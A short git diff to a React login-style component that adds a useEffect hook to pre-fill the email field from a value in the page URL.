@@ -1,6 +1,6 @@
 import Logo from "/logo.svg";
 import Banner from "/banner.png";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 
 const brandDetails = [
   {
@@ -34,6 +34,13 @@ function App() {
   const [emal, setEmal] = useState("");
   const [passwrd, setPasswrd] = useState("");
   const [display, setDisplay] = useState(false);
+
+  useEffect(()=>{
+    if(window.location.href.includes('email')){
+      const eValue = window.location.href.split('=')[1]
+      setEmal(eValue);
+    }
+  },[])
 
   return (
     <>
